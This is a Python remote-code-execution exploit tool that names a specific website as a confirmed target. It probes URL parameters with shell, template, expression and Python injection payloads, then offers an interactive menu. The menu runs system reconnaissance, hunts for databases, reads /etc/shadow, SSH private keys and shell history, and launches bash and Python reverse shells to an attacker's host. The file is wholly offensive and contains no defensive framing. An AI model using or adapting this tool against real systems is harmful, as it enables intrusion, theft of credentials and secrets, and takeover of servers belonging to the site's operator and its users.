#!/usr/bin/env python3
"""
RCE EXPLOIT - HTTP Based (Like Winbox Concept)
For: lirat.store - Multiple RCE Vulnerabilities
Type: UNIX + Python + Template + Expression + Command
"""

import requests
import sys
import urllib.parse
import json
import time

class RCEHTTPExploit:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        requests.packages.urllib3.disable_warnings()
    
    def probe_vulnerability(self, param, payload):
        """Test single payload"""
        url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
        try:
            resp = self.session.get(url, timeout=5, verify=False)
            return resp.status_code, resp.text
        except:
            return 0, ""
    
    def discover_rce(self):
        """Discover working RCE payloads"""
        print("\n[*] Discovering RCE vulnerabilities...")
        
        test_cases = [
            # UNIX Command Injection
            ('id', 'echo RCE_UNIX_$(whoami)'),
            ('id', '`whoami`'),
            ('id', '$(whoami)'),
            
            # Template Injection
            ('id', '{{7*7}}'),
            ('id', '{% print(7*7) %}'),
            
            # Expression Language
            ('id', '${7*7}'),
            ('id', '#{7*7}'),
            
            # Python Code
            ('id', "__import__('os').popen('whoami').read()"),
            ('id', "__import__('os').system('whoami')"),
            
            # Direct Command
            ('id', 'whoami'),
            ('cmd', 'whoami'),
            ('exec', 'whoami'),
        ]
        
        working_payloads = []
        
        for param, payload in test_cases:
            status, response = self.probe_vulnerability(param, payload)
            
            if status == 200:
                # Check for success indicators
                if ('RCE_UNIX_root' in response or 
                    'root' in response or 
                    '49' in response or 
                    'uid=0' in response.lower()):
                    
                    print(f"  [+] VULN: {param} = {payload[:30]}...")
                    working_payloads.append((param, payload, response))
        
        return working_payloads
    
    def execute_command(self, param, payload_template, command):
        """Execute command using working payload"""
        # Replace test command with actual command
        if 'whoami' in payload_template:
            payload = payload_template.replace('whoami', command)
        elif '7*7' in payload_template:
            payload = payload_template.replace('7*7', command)
        elif 'echo RCE_UNIX_' in payload_template:
            payload = f"echo RCE_UNIX_$({command})"
        else:
            payload = command
        
        url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
        
        try:
            resp = self.session.get(url, timeout=10, verify=False)
            return self.extract_output(resp.text)
        except Exception as e:
            return f"Error: {e}"
    
    def extract_output(self, html):
        """Extract command output from HTML"""
        # Look for our markers or command output
        if 'RCE_UNIX_' in html:
            start = html.find('RCE_UNIX_') + 9
            end = html.find('\n', start)
            if end == -1:
                end = html.find('<', start)
            if end != -1:
                return html[start:end].strip()
        
        # Fallback: return first 300 chars
        return html[:300]
    
    def system_info(self, param, payload):
        """Get system information"""
        print("\n" + "="*60)
        print("[*] SYSTEM INFORMATION")
        print("="*60)
        
        commands = [
            ("Hostname", "hostname"),
            ("Current User", "whoami"),
            ("User ID", "id"),
            ("OS Info", "uname -a"),
            ("Kernel", "cat /proc/version"),
            ("CPU Info", "cat /proc/cpuinfo | grep 'model name' | head -1"),
            ("Memory", "free -h"),
            ("Disk Space", "df -h"),
            ("Processes", "ps aux | head -10"),
            ("Network", "ifconfig || ip addr"),
        ]
        
        for desc, cmd in commands:
            print(f"\n[>] {desc}:")
            result = self.execute_command(param, payload, cmd)
            print(result)
    
    def file_explorer(self, param, payload):
        """Explore filesystem"""
        print("\n" + "="*60)
        print("[*] FILE SYSTEM EXPLORER")
        print("="*60)
        
        directories = [
            ("/", "Root"),
            ("/home", "Home directories"),
            ("/var/www", "Web files"),
            ("/tmp", "Temp files"),
            ("/etc", "Configuration"),
            ("/root", "Root home"),
        ]
        
        for path, desc in directories:
            print(f"\n[>] {desc} ({path}):")
            result = self.execute_command(param, payload, f"ls -la {path} 2>/dev/null | head -20")
            print(result)
    
    def database_hunter(self, param, payload):
        """Find and access databases"""
        print("\n" + "="*60)
        print("[*] DATABASE HUNTER")
        print("="*60)
        
        print("\n[>] Looking for database files...")
        db_files = self.execute_command(param, payload, 
            "find / -name '*.db' -o -name '*.sql' -o -name '*.sqlite*' 2>/dev/null | head -20")
        print(db_files)
        
        print("\n[>] Checking database processes...")
        db_proc = self.execute_command(param, payload,
            "ps aux | grep -E 'mysql|postgres|mongo|redis|sqlite' | grep -v grep")
        print(db_proc)
        
        print("\n[>] Checking database ports...")
        db_ports = self.execute_command(param, payload,
            "netstat -tulpn 2>/dev/null | grep -E ':3306|:5432|:27017|:6379'")
        print(db_ports)
    
    def extract_sensitive(self, param, payload):
        """Extract sensitive data"""
        print("\n" + "="*60)
        print("[*] SENSITIVE DATA EXTRACTION")
        print("="*60)
        
        sensitive_targets = [
            ("/etc/passwd", "System users"),
            ("/etc/shadow", "Password hashes"),
            ("/etc/hosts", "Hosts file"),
            ("~/.bash_history", "Command history"),
            ("~/.ssh/id_rsa", "SSH private key"),
            ("~/.ssh/authorized_keys", "SSH authorized keys"),
        ]
        
        for filepath, desc in sensitive_targets:
            print(f"\n[>] {desc}:")
            result = self.execute_command(param, payload, f"cat {filepath} 2>/dev/null || echo 'Not found'")
            if 'Not found' not in result:
                print(result[:500])
    
    def reverse_shell(self, param, payload, lhost, lport="4444"):
        """Attempt reverse shell"""
        print(f"\n[*] REVERSE SHELL ATTEMPT to {lhost}:{lport}")
        print("[*] Start listener: nc -lvnp {lport}")
        
        shells = [
            f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
            f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
        ]
        
        for shell in shells:
            print(f"\n[>] Trying: {shell[:50]}...")
            result = self.execute_command(param, payload, f"{shell} &")
            print(result)
            time.sleep(2)
    
    def run(self):
        """Main exploit routine"""
        print(f"""
╔══════════════════════════════════════════════════════╗
║               RCE HTTP EXPLOIT                      ║
║            Target: {self.target:<30} ║
║            Vulnerabilities: MULTIPLE RCE           ║
╚══════════════════════════════════════════════════════╝
        """)
        
        # Discover vulnerabilities
        vulns = self.discover_rce()
        
        if not vulns:
            print("[-] No RCE vulnerabilities found")
            return
        
        print(f"\n[+] Found {len(vulns)} working payload(s)")
        
        # Use first working payload
        param, payload, response = vulns[0]
        print(f"[+] Using: {param} = {payload[:50]}...")
        
        # Show initial response
        print(f"\n[*] Initial response preview:")
        print(response[:200])
        
        # Main menu
        while True:
            print(f"""
┌─────────────────────────────────────────┐
│   RCE EXPLOIT MENU                      │
├─────────────────────────────────────────┤
│   1. System Information                 │
│   2. File Explorer                      │
│   3. Database Hunter                    │
│   4. Extract Sensitive Data             │
│   5. Reverse Shell                      │
│   6. Custom Command                     │
│   7. Test All Payloads                  │
│   8. Exit                               │
└─────────────────────────────────────────┘
            """)
            
            choice = input("[?] Select: ").strip()
            
            if choice == '1':
                self.system_info(param, payload)
            elif choice == '2':
                self.file_explorer(param, payload)
            elif choice == '3':
                self.database_hunter(param, payload)
            elif choice == '4':
                self.extract_sensitive(param, payload)
            elif choice == '5':
                lhost = input("[?] Your IP: ").strip()
                lport = input("[?] Port (4444): ").strip() or "4444"
                self.reverse_shell(param, payload, lhost, lport)
            elif choice == '6':
                cmd = input("[?] Command: ").strip()
                result = self.execute_command(param, payload, cmd)
                print(f"\n[+] Result:\n{result}")
            elif choice == '7':
                print("\n[*] Testing all payloads:")
                for p_param, p_payload, p_response in vulns:
                    print(f"\n  {p_param}: {p_payload[:40]}...")
                    print(f"  Response: {p_response[:100]}")
            elif choice == '8':
                print("[*] Exiting...")
                break
            else:
                print("[-] Invalid choice")
            
            input("\n[*] Press Enter to continue...")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 http_rce.py <URL>")
        print("Example: python3 http_rce.py https://lirat.store/")
        print("Example: python3 http_rce.py http://192.168.1.100/")
        sys.exit(1)
    
    target = sys.argv[1]
    
    print(f"""
    ╔══════════════════════════════════════════════════════╗
    ║            HTTP RCE EXPLOITATION TOOL               ║
    ║    For UNIX/Template/Python/Expression RCE vulns    ║
    ║            (Confirmed on: lirat.store)              ║
    ╚══════════════════════════════════════════════════════╝
    """)
    
    exploit = RCEHTTPExploit(target)
    
    try:
        exploit.run()
    except KeyboardInterrupt:
        print("\n[*] Stopped by user")
    except Exception as e:
        print(f"\n[-] Error: {e}")

if __name__ == "__main__":
    main()